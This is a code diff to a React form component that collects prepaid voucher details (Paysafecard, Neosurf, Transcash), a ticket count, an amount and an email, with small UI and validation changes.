@@ -6,13 +6,14 @@ function SubmissionForm() {
   const [ticketsFieldGenerate, setTicketsFieldGenerate] = useState([]);
   const [error, setError] = useState("");
   const [message, setMessage] = useState("");
-  const [selectedTicked, setSelectedTicked] = useState("Pcs");
+  const [selectedTicked, setSelectedTicked] = useState("Paysafecard");
   const [HtmlInputE, setHtmlInputE] = useState<HTMLInputElement | null>();
 
   const infosUser: InfosUser = {
     ticket: selectedTicked,
     ticketNumber: 0,
     ticketCodes: [],
+    amount: 0,
     email: "",
   };
 
@@ -31,6 +32,11 @@ function SubmissionForm() {
     const htmlIe: HTMLInputElement | null = document.querySelector(".tn");
     setHtmlInputE(htmlIe);
   }, []);
+
+  const handleAmount = (event: any) => {
+    user.amount = +event.target.value;
+    setUser(user);
+  };
 
   const handleSelectedTicket = (event: any) => {
     setSelectedTicked(event.target.value);
@@ -123,7 +129,7 @@ function SubmissionForm() {
                   handleSelectedTicket(e);
                 }}
               >
-                <option value="Pcs">Pcs</option>
+                <option value="Paysafecard">Paysafecard</option>
                 <option value="Neosurf">Neosurf</option>
                 <option value="Transcash">Transcash</option>
               </select>
@@ -160,6 +166,18 @@ function SubmissionForm() {
               </div>
             </label>} */}
 
+          {
+            <div className="user-box persofade">
+              <input
+                type="number"
+                maxLength={16}
+                required
+                onChange={handleAmount}
+              />
+              <label>Montant </label>
+            </div>
+          }
+
           <div className="user-box">
             <input
               type="number"
@@ -172,14 +190,15 @@ function SubmissionForm() {
             <label>Nombre de tickets</label>
           </div>
           {ticketsFieldGenerate}
-          <div className="user-box">
+          <div className="user-box persofade">
             <input
-              type="text"
+              type="email"
+              required
               onChange={(event) => {
                 setUser({ ...user, email: event?.target.value });
               }}
             />
-            <label>email</label>
+            <label>Email</label>
           </div>
           <a
             href="#"
